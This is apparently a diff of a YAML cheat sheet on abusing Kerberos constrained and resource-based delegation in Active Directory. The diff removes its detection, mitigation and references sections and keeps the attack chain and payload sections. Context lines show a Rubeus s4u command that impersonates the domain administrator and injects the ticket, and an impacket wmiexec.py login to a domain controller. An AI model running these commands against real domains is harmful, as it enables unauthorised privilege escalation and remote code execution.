@@ -279,42 +279,6 @@ resource_based_delegation:
       Rubeus.exe s4u /user:evilpc$ /rc4:HASH /impersonateuser:administrator /msdsspn:"CIFS/target.domain.local" /ptt
 
 # 检测和防御
-defense:
-  - detection: |
-      # 检测约束委派攻击
-
-      # 1. 监控异常的S4U请求
-      # Kerberos事件日志
-
-      # 2. 监控委派配置变更
-      Get-WinEvent -FilterHashtable @{
-        LogName='Security'
-        ID=4738,4742
-      } | Where-Object {
-        $_.Message -match "AllowedToDelegate"
-      }
-
-      # 3. 监控服务账户使用
-
-      # 4. 审计委派关系
-
-      # 5. 使用BloodHound定期分析
-
-  - mitigation: |
-      # 缓解措施
-
-      # 1. 减少约束委派配置
-
-      # 2. 使用资源约束委派替代
-
-      # 3. 审查服务账户权限
-
-      # 4. 禁用协议转换(除非必要)
-
-      # 5. 监控S4U使用
-
-      # 6. 使用组托管服务账户(gMSA)
-
 # 完整攻击流程
 attack_chain:
   - step1: "枚举约束委派配置"
@@ -356,9 +320,3 @@ payloads:
       python wmiexec.py -k -no-pass domain.local/administrator@dc.domain.local
 
 # 参考资源
-references:
-  - https://github.com/GhostPack/Rubeus
-  - https://github.com/gentilkiwi/kekeo
-  - https://github.com/SecureAuthCorp/impacket
-  - https://adsecurity.org/?p=1667
-  - https://www.harmj0y.net/blog/activedirectory/abusing-kerberos-delegation/
